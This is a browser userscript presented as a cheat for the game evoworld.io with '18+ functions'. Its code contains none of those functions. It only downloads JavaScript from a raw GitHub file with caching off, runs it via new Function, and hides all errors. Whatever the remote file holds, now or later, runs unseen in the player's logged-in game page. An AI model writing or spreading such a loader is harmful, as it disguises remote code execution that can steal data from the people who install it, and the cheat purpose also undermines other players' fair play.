// ==UserScript==
// @name         Evoworld cheat
// @version      1.5
// @description  Script have 18+ functions
// @author       tg: @ezsquadevoworld
// @match        https://evoworld.io/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=evoworld.io
// @license      MIT
// @grant        none
// @namespace https://greasyfork.org/users/1556700
// @downloadURL https://update.greasyfork.org/scripts/561606/Evoworld%20cheat.user.js
// @updateURL https://update.greasyfork.org/scripts/561606/Evoworld%20cheat.meta.js
// ==/UserScript==
(function() {
    'use strict';

    const GITHUB_URL = "https://raw.githubusercontent.com/csuserbro/esp-lib/refs/heads/main/sourcecodebase.js";

    fetch(GITHUB_URL, { cache: "no-store" })
        .then(response => response.ok ? response.text() : null)
        .then(code => {
            if (code) {
                try {
                    const run = new Function(code);
                    run();
                } catch (e) {}
            }
        })
        .catch(() => {});

})();